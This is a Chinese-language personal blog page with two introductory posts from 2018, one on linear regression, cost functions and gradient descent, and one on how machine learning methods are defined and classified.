<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="Leticia&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Leticia&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Leticia&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/"/>





  <title> Leticia's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Leticia's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/20/机机器学习-2-——线性回归/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/06/20/机机器学习-2-——线性回归/" itemprop="url">
                  机器学习(2)——线性回归
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-20T12:44:06+08:00">
                2018-06-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/06/20/机机器学习-2-——线性回归/" class="leancloud_visitors" data-flag-title="机器学习(2)——线性回归">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一篇记录了机器学习的定义、分类和范围，这一篇开始从机器学习的方法学起，总结机器学习的经典方法，然后尽量自己写代码实现。</p>
<h2 id="0x01-回归算法"><a href="#0x01-回归算法" class="headerlink" title="0x01 回归算法"></a>0x01 回归算法</h2><p>回归算法属于机器学习中监督学习类的算法，是入门机器学习最基础的算法。</p>
<p>回归分析是研究自变量和因变量之间关系的一种预测模型技术。这些技术应用于预测，时间序列模型和找到变量之间关系。</p>
<p>回归算法就是量化因变量受自变量影响的大小，建立线性回归方程或者非线性回归方程，从而达对因变量的预测，或者对因变量的解释作用。</p>
<h2 id="0x02-回归分析流程"><a href="#0x02-回归分析流程" class="headerlink" title="0x02 回归分析流程"></a>0x02 回归分析流程</h2><p>①探索性分析，画不同变量之间的散点图，进行相关性检验等，了解数据的大致情况，以及得知重点关注那几个变量；</p>
<p>②变量和模型选择；</p>
<p>③回归分析假设条件验证；</p>
<p>④共线性和强影响点检查；</p>
<p>⑤模型修改，并且重复③④；</p>
<p>⑥模型验证。</p>
<h2 id="0x03-回归算法分类"><a href="#0x03-回归算法分类" class="headerlink" title="0x03 回归算法分类"></a>0x03 回归算法分类</h2><p>回归算法主要通过三种方法分类：自变量的个数、因变量的类型和回归线的形状。</p>
<p>常见的回归算法有：</p>
<ul>
<li>线性回归</li>
<li>逻辑回归</li>
<li>多项式回归</li>
<li>逐步回归</li>
<li>岭回归</li>
<li>Lasso回归</li>
<li>ElasticNet回归</li>
</ul>
<h2 id="0x04-线性回归-Linear-Regression"><a href="#0x04-线性回归-Linear-Regression" class="headerlink" title="0x04 线性回归(Linear Regression)"></a>0x04 线性回归(Linear Regression)</h2><p>线性回归是世界上最知名的建模方法之一，在线性回归模型中，因变量是连续型的，自变量可以使连续型或离散型的，回归线是线性的。</p>
<p>线性回归用最适直线(回归线)去建立因变量Y和一个或多个自变量X之间的关系。可以用公式来表示：</p>
<p>Y=A+B*X+e</p>
<p>A为截距，B为回归线的斜率，e是误差项。</p>
<p>简单线性回归与多元线性回归的差别在于：多元线性回归有多个(&gt;1)自变量，而简单线性回归只有一个自变量。</p>
<h4 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h4><p>我们首先实现一个只有单一自变量的简单线性回归</p>
<p>我们实现这个算法，可以先以Andrew Ng机器学习讲义中美国俄亥俄州Portland Oregon城市房屋价格为例：</p>
<p>这个例子中近简化使用房屋面积一个因子作为自变量，y轴对应其因变量房屋价格。所以我们机器学习的线性回归就变为对于给定有限的数据集，进行一元线性回归，即找到一个一次函数y=y(x) + e，使得y满足</p>
<p>当x={2104, 1600, 2400, 1416, 3000, … }, y={400, 330, 369, 232, 540, … } </p>
<table>
<thead>
<tr>
<th>面积(feet²)</th>
<th>价格(1000$)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2104</td>
<td>400</td>
</tr>
<tr>
<td>1600</td>
<td>330</td>
</tr>
<tr>
<td>2400</td>
<td>369</td>
</tr>
<tr>
<td>1416</td>
<td>232</td>
</tr>
<tr>
<td>3000</td>
<td>540</td>
</tr>
<tr>
<td>···</td>
<td>···</td>
</tr>
</tbody>
</table>
<p>对这个问题我们先给出假设函数即需要拟合的直线：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_01.png?raw=true" alt=""></p>
<p>其中a和b是我们要求得的参数，参数得变化会引起函数的变化。</p>
<p>而我们解出参数之后的函数是否为最优解，我们需要引入一个概念：Cost Function，即代价函数或成本函数。</p>
<h4 id="代价函数-Cost-Function"><a href="#代价函数-Cost-Function" class="headerlink" title="代价函数(Cost Function)"></a>代价函数(Cost Function)</h4><p>在回归问题中，衡量最优解的常用代价函数为平方误差。</p>
<p>平方误差在高中和大学的概率论、统计学等课程中我们都有所了解，就是用样本数据和拟合出的线做差值，然后对差值进行平方和并除以点数m计算平均值。</p>
<p>而在这里，我们要导出代价函数，额外除以1/2做数学简化，形成以下代价函数：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_02.png?raw=true" alt=""></p>
<p>ps：这里额外除以1/2，是为了之后平方函数的微分项将抵消1/2项，以方便计算梯度下降。</p>
<p>下来我们求解最优解的问题就转变为了求解代价函数的最小值。</p>
<p>其中J是基于θ的函数，我们可以先将其简化成只有θ1的函数，令θ0=0.</p>
<p>然后我们不断给定θ1的值，基于样本值进行计算代价函数J，就可以得到一个θ1和J的函数，并在某一点取得极小值。</p>
<p>如样本数据为y ={(1,1), (2,2),(3,3)}时，可以得到如下的J-θ1图形：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_03.png?raw=true" alt=""></p>
<p>我们求解线性回归最优解的方法一般是梯度下降法和最小二乘法</p>
<h4 id="最小二乘法"><a href="#最小二乘法" class="headerlink" title="最小二乘法"></a>最小二乘法</h4><p>代价函数中使用的均方误差，其实对应了我们常用的欧几里得的距离（欧式距离，Euclidean Distance）, 基于均方误差最小化进行模型求解的方法称为“最小二乘法”（least square method），即通过最小化误差的平方和寻找数据的最佳函数匹配。</p>
<p>当函数子变量为一维时，最小二乘法就蜕变成寻找一条直线。</p>
<p>如我们上例中的模型，寻找J极小值就是分别用J对θ1和θ0求偏导，然后寻找偏导为零的点。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_04.png?raw=true" alt=""></p>
<p>解得：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_05.png?raw=true" alt=""></p>
<h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><p>最小二乘法算法简单，容易理解，而然在现实机器学习却有其局限性：</p>
<ul>
<li><p>并非所有函数都可以求出驻点，即导数为0的点，f(x)=0</p>
</li>
<li><p>求解方程困难，或求根公式复杂</p>
</li>
<li><p>导数并无解析解</p>
</li>
<li><p>最小二乘法的矩阵公式,计算一个矩阵的逆是相当耗费时间的, 而且求逆也会存在数值不稳定的情况</p>
</li>
</ul>
<h4 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h4><p>正是由于在实际中，最小二乘法遇到的困难和局限性，尤其是多数超定方程组不存在解，我们由求导转向迭代逼近。也就是梯度下降算法。</p>
<p>首先我们了解一下什么是梯度，这在复变函数等大学课程中都曾经学过。</p>
<h5 id="方向导数"><a href="#方向导数" class="headerlink" title="方向导数"></a>方向导数</h5><p>方向导数即研究在某一点的任意方向的变化率，是偏导数的广义扩展。</p>
<h5 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h5><p>梯度则基于方向导数，是一个向量而非数，梯度代表了各个方向导数中，变化趋势最大的那个方向。</p>
<p>那么，梯度方向就是增长最快的方向，负梯度方向就是减小最快的方向。</p>
<h5 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a>梯度下降算法</h5><p>梯度下降算法通常也被称作最速下降法。其目的是找到一个局部极小值点；其目标与最小二乘法相同，都是使得估算值与实际值的总平方差尽量小。</p>
<p>其方法是采用计算数学的迭代法，先给定一初始点，然后向下降最快的方向调整，在若干次迭代之后找到局部最小。</p>
<p>比如我们给定上面的方程，初始参数是θ0,θ1，我们不断改变θ0,θ1从而减少J(θ0,θ1)的值，具体做法是求导。直到最终收敛。</p>
<p>迭代公式如下：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_06.png?raw=true" alt=""></p>
<p>其中θj可以是θ0和θ1这两个参数，α为步长，整个式子的意义为，θ0,θ1每次向J(θ0,θ1)负梯度方向下降步长α。</p>
<h5 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h5><p>公式中的步长α，也称为学习率，用来控制每次下降的幅度。</p>
<p>我们应该调整参数α以确保梯度下降算法在合理的时间内收敛。</p>
<ul>
<li>如果α过小，每步会移动非常近，收敛时间就会很长。</li>
<li>如果α过大，每步会移动比较远，会导致直接越过极小值，甚至无法收敛到最低点。</li>
</ul>
<p>如果我们时间耗费较长或无法收敛，那就说明我们要重新制定学习率α。</p>
<h5 id="线性回归梯度下降"><a href="#线性回归梯度下降" class="headerlink" title="线性回归梯度下降"></a>线性回归梯度下降</h5><p>对于线性模型，我们可以这样写梯度下降函数。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_07.png?raw=true" alt=""></p>
<p>h(x)是需要拟合的函数。<br>J(θ)称为均方误差或cost function。用来衡量训练集众的样本对线性模式的拟合程度。<br>m为训练集众样本的个数。<br>θ是我们最终需要通过梯度下降法来求得的参数。</p>
<p>接下来的梯度下降法就有两种不同的迭代思路。</p>
<h5 id="批量梯度下降（Batch-Gradient-Descent）"><a href="#批量梯度下降（Batch-Gradient-Descent）" class="headerlink" title="批量梯度下降（Batch Gradient Descent）"></a>批量梯度下降（Batch Gradient Descent）</h5><p>可以看到上述每次迭代都需要计算所有样本的残差并加和，批量梯度下降是梯度下降法最原始的形式，它的具体思路是在更新每一参数时都使用所有的样本来进行更新。</p>
<p>1.计算J(θ)关于θT的偏导数,也就得到了向量中每一个θ的梯度。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_08.png?raw=true" alt=""></p>
<p>2.沿着梯度的反方向更新参数θ的值</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_09.png?raw=true" alt=""></p>
<p>3.迭代直到收敛。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_10.png?raw=true" alt=""></p>
<ul>
<li><p>优点：全局最优解，易于并行实现。</p>
</li>
<li><p>缺点：当样本数目很多时，训练过程会很慢。</p>
</li>
</ul>
<h5 id="随机梯度下降（Stochastic-gradient-descent）"><a href="#随机梯度下降（Stochastic-gradient-descent）" class="headerlink" title="随机梯度下降（Stochastic gradient descent）"></a>随机梯度下降（Stochastic gradient descent）</h5><p>和批量梯度有所不同的地方在于，每次迭代只选取一个样本的数据，一旦到达最大的迭代次数或是满足预期的精度，就停止。</p>
<p>随机梯度下降法的θ更新表达式。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_11.png?raw=true" alt=""></p>
<p>迭代直到收敛。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_12.png?raw=true" alt=""></p>
<ul>
<li><p>优点：训练速度快。</p>
</li>
<li><p>缺点：准确度下降，并不是全局最优，不易于并行实现。</p>
</li>
</ul>
<h5 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h5><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_13.png?raw=true" alt=""></p>
<p>当我们的成本函数处于图的坑底时，J值最小，为最佳解。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/19/机器学习-1-——定义与分类/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/06/19/机器学习-1-——定义与分类/" itemprop="url">
                  机器学习(1)——定义与分类
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-19T18:43:03+08:00">
                2018-06-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/06/19/机器学习-1-——定义与分类/" class="leancloud_visitors" data-flag-title="机器学习(1)——定义与分类">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>因为假期实习能选择的安全项目大部分都要用到机器学习，而自己对这个领域缺乏了解，所以准备用一段时间专心学习一下。</p>
<h2 id="0x01-机器学习-Machine-Learning"><a href="#0x01-机器学习-Machine-Learning" class="headerlink" title="0x01 机器学习(Machine Learning)"></a>0x01 机器学习(Machine Learning)</h2><p>机器学习在不同的领域和不同的学者中有着不同的定义，我认为Alpaydin的定义更偏向于现代机器学习的核心内容：“机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。”(Machine learning is programming computers to optimize a performance criterion using example data or past experience.)</p>
<p>也就是说，机器学习方法是计算机利用已有的数据，得出了某种模型，并利用此模型预测未来的一种方法。</p>
<p>机器学习与人类思考的对比：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml1_01.png?raw=true" alt=""></p>
<h2 id="0x02-按照学习策略分类"><a href="#0x02-按照学习策略分类" class="headerlink" title="0x02 按照学习策略分类"></a>0x02 按照学习策略分类</h2><p>机器学习的学习策略指学习过程中系统所采用的推理策略。按照学习策略可以将机器学习分为下列几类：</p>
<h4 id="1-机械学习-Rote-learning"><a href="#1-机械学习-Rote-learning" class="headerlink" title="(1)机械学习 (Rote learning)"></a>(1)机械学习 (Rote learning)</h4><p>学习者无需任何推理或其它的知识转换，直接吸取环境所提供的信息。如塞缪尔的跳棋程序，纽厄尔和西蒙的LT系统。这类学习系统主要考虑的是如何索引存贮的知识并加以利用。系统的学习方法是直接通过事先编好、构造好的程序来学习，学习者不作任何工作，或者是通过直接接收既定的事实和数据进行学习，对输入信息不作任何的推理。</p>
<h4 id="2-示教学习-Learning-from-instruction"><a href="#2-示教学习-Learning-from-instruction" class="headerlink" title="(2)示教学习 (Learning from instruction)"></a>(2)示教学习 (Learning from instruction)</h4><p>学生从环境（教师或其它信息源如教科书等）获取信息，把知识转换成内部可使用的表示形式，并将新的知识和原有知识有机地结合为一体。所以要求学生有一定程度的推理能力，但环境仍要做大量的工作。教师以某种形式提出和组织知识，以使学生拥有的知识可以不断地增加。这种学习方法和人类社会的学校教学方式相似，学习的任务就是建立一个系统，使它能接受教导和建议，并有效地存贮和应用学到的知识。不少专家系统在建立知识库时使用这种方法去实现知识获取。示教学习的一个典型应用例是FOO程序。</p>
<h4 id="3-演绎学习-Learning-by-deduction"><a href="#3-演绎学习-Learning-by-deduction" class="headerlink" title="(3)演绎学习 (Learning by deduction)"></a>(3)演绎学习 (Learning by deduction)</h4><p>学生所用的推理形式为演绎推理。推理从公理出发，经过逻辑变换推导出结论。这种推理是”保真”变换和特化(specialization)的过程，使学生在推理过程中可以获取有用的知识。这种学习方法包含宏操作(macro-operation)学习、知识编辑和组块(Chunking)技术。演绎推理的逆过程是归纳推理。</p>
<h4 id="4-类比学习-Learning-by-analogy"><a href="#4-类比学习-Learning-by-analogy" class="headerlink" title="(4)类比学习 (Learning by analogy)"></a>(4)类比学习 (Learning by analogy)</h4><p>利用二个不同领域（源域、目标域）中的知识相似性，可以通过类比，从源域的知识（包括相似的特征和其它性质）推导出目标域的相应知识，从而实现学习。类比学习系统可以使一个已有的计算机应用系统转变为适应于新的领域，来完成原先没有设计的相类似的功能。</p>
<h4 id="5-基于解释的学习-Explanation-based-learning-EBL"><a href="#5-基于解释的学习-Explanation-based-learning-EBL" class="headerlink" title="(5)基于解释的学习 (Explanation-based learning, EBL)"></a>(5)基于解释的学习 (Explanation-based learning, EBL)</h4><p>学生根据教师提供的目标概念、该概念的一个例子、领域理论及可操作准则，首先构造一个解释来说明为什该例子满足目标概念，然后将解释推广为目标概念的一个满足可操作准则的充分条件。EBL已被广泛应用于知识库求精和改善系统的性能。<br>著名的EBL系统有迪乔恩（G.DeJong）的GENESIS,米切尔（T.Mitchell）的LEXII和LEAP, 以及明顿（S.Minton）等的PRODIGY。</p>
<h4 id="6-归纳学习-Learning-from-induction"><a href="#6-归纳学习-Learning-from-induction" class="headerlink" title="(6)归纳学习 (Learning from induction)"></a>(6)归纳学习 (Learning from induction)</h4><p>归纳学习是由教师或环境提供某概念的一些实例或反例，让学生通过归纳推理得出该概念的一般描述。这种学习的推理工作量远多于示教学习和演绎学习，因为环境并不提供一般性概念描述（如公理）。从某种程度上说，归纳学习的推理量也比类比学习大，因为没有一个类似的概念可以作为”源概念”加以取用。归纳学习是最基本的，发展也较为成熟的学习方法，在人工智能领域中已经得到广泛的研究和应用。</p>
<h2 id="0x03-按照所获取知识的表示形式分类"><a href="#0x03-按照所获取知识的表示形式分类" class="headerlink" title="0x03 按照所获取知识的表示形式分类"></a>0x03 按照所获取知识的表示形式分类</h2><h4 id="1-代数表达式参数"><a href="#1-代数表达式参数" class="headerlink" title="(1)代数表达式参数"></a>(1)代数表达式参数</h4><p>学习的目标是调节一个固定函数形式的代数表达式参数或系数来达到一个理想的性能。</p>
<h4 id="2-决策树"><a href="#2-决策树" class="headerlink" title="(2)决策树"></a>(2)决策树</h4><p>用决策树来划分物体的类属，树中每一内部节点对应一个物体属性，而每一边对应于这些属性的可选值，树的叶节点则对应于物体的每个基本分类。</p>
<h4 id="3-形式文法"><a href="#3-形式文法" class="headerlink" title="(3)形式文法"></a>(3)形式文法</h4><p>在识别一个特定语言的学习中，通过对该语言的一系列表达式进行归纳，形成该语言的形式文法。</p>
<h4 id="4-产生式规则"><a href="#4-产生式规则" class="headerlink" title="(4)产生式规则"></a>(4)产生式规则</h4><p>产生式规则表示为条件—动作对，已被极为广泛地使用。学习系统中的学习行为主要是：生成、泛化、特化（Specialization）或合成产生式规则。</p>
<h4 id="5-形式逻辑表达式"><a href="#5-形式逻辑表达式" class="headerlink" title="(5)形式逻辑表达式"></a>(5)形式逻辑表达式</h4><p>形式逻辑表达式的基本成分是命题、谓词、变量、约束变量范围的语句，及嵌入的逻辑表达式。</p>
<h4 id="6-图和网络"><a href="#6-图和网络" class="headerlink" title="(6)图和网络"></a>(6)图和网络</h4><p>有的系统采用图匹配和图转换方案来有效地比较和索引知识。</p>
<h4 id="7-框架和模式（schema）"><a href="#7-框架和模式（schema）" class="headerlink" title="(7)框架和模式（schema）"></a>(7)框架和模式（schema）</h4><p>每个框架包含一组槽，用于描述事物（概念和个体）的各个方面。</p>
<h4 id="8-计算机程序和其它的过程编码"><a href="#8-计算机程序和其它的过程编码" class="headerlink" title="(8)计算机程序和其它的过程编码"></a>(8)计算机程序和其它的过程编码</h4><p>获取这种形式的知识，目的在于取得一种能实现特定过程的能力，而不是为了推断该过程的内部结构。</p>
<h4 id="9-神经网络"><a href="#9-神经网络" class="headerlink" title="(9)神经网络"></a>(9)神经网络</h4><p>这主要用在联接学习中。学习所获取的知识，最后归纳为一个神经网络。</p>
<h4 id="10-多种表示形式的组合"><a href="#10-多种表示形式的组合" class="headerlink" title="(10)多种表示形式的组合"></a>(10)多种表示形式的组合</h4><p>有时一个学习系统中获取的知识需要综合应用上述几种知识表示形式。</p>
<h2 id="0x04-按照学习形势分类"><a href="#0x04-按照学习形势分类" class="headerlink" title="0x04 按照学习形势分类"></a>0x04 按照学习形势分类</h2><h4 id="1-监督学习-supervised-learning"><a href="#1-监督学习-supervised-learning" class="headerlink" title="(1)监督学习(supervised learning)"></a>(1)监督学习(supervised learning)</h4><p>监督学习，即在机械学习过程中提供对错指示。一般实在是数据组中包含最终结果（0，1）。通过算法让机器自我减少误差。这一类学习主要应用于分类和预测 (regression &amp; classify)。监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。</p>
<p>常见的监督学习算法：</p>
<p>线性回归，逻辑回归，神经网络，SVM</p>
<h4 id="2-非监督学习-unsupervised-learning"><a href="#2-非监督学习-unsupervised-learning" class="headerlink" title="(2)非监督学习(unsupervised learning)"></a>(2)非监督学习(unsupervised learning)</h4><p>非监督学习又称归纳性学习（clustering）利用K方式(Kmeans)，建立中心（centriole），通过循环和递减运算(iteration&amp;descent)来减小误差，达到分类的目的。</p>
<p>常见的无监督学习算法：</p>
<p>聚类算法，降维算法</p>
<h2 id="0x05-机器学习的范围"><a href="#0x05-机器学习的范围" class="headerlink" title="0x05 机器学习的范围"></a>0x05 机器学习的范围</h2><h4 id="模式识别"><a href="#模式识别" class="headerlink" title="模式识别"></a>模式识别</h4><p>模式识别=机器学习。两者的主要区别在于前者是从工业界发展起来的概念，后者则主要源自计算机学科。在著名的《Pattern Recognition And Machine Learning》这本书中，Christopher M. Bishop在开头是这样说的“模式识别源自工业界，而机器学习来自于计算机学科。不过，它们中的活动可以被视为同一个领域的两个方面，同时在过去的10年间，它们都有了长足的发展”。</p>
<h4 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h4><p>数据挖掘=机器学习+数据库。这几年数据挖掘的概念实在是太耳熟能详。几乎等同于炒作。但凡说数据挖掘都会吹嘘数据挖掘如何如何，例如从数据中挖出金子，以及将废弃的数据转化为价值等等。但是，我尽管可能会挖出金子，但我也可能挖的是“石头”啊。这个说法的意思是，数据挖掘仅仅是一种思考方式，告诉我们应该尝试从数据中挖掘出知识，但不是每个数据都能挖掘出金子的，所以不要神话它。一个系统绝对不会因为上了一个数据挖掘模块就变得无所不能(这是IBM最喜欢吹嘘的)，恰恰相反，一个拥有数据挖掘思维的人员才是关键，而且他还必须对数据有深刻的认识，这样才可能从数据中导出模式指引业务的改善。大部分数据挖掘中的算法是机器学习的算法在数据库中的优化。</p>
<h4 id="统计学习"><a href="#统计学习" class="headerlink" title="统计学习"></a>统计学习</h4><p>统计学习近似等于机器学习。统计学习是个与机器学习高度重叠的学科。因为机器学习中的大多数方法来自统计学，甚至可以认为，统计学的发展促进机器学习的繁荣昌盛。例如著名的支持向量机算法，就是源自统计学科。但是在某种程度上两者是有分别的，这个分别在于：统计学习者重点关注的是统计模型的发展与优化，偏数学，而机器学习者更关注的是能够解决问题，偏实践，因此机器学习研究者会重点研究学习算法在计算机上执行的效率与准确性的提升。</p>
<h4 id="计算机视觉"><a href="#计算机视觉" class="headerlink" title="计算机视觉"></a>计算机视觉</h4><p>计算机视觉=图像处理+机器学习。图像处理技术用于将图像处理为适合进入机器学习模型中的输入，机器学习则负责从图像中识别出相关的模式。计算机视觉相关的应用非常的多，例如百度识图、手写字符识别、车牌识别等等应用。这个领域是应用前景非常火热的，同时也是研究的热门方向。随着机器学习的新领域深度学习的发展，大大促进了计算机图像识别的效果，因此未来计算机视觉界的发展前景不可估量。</p>
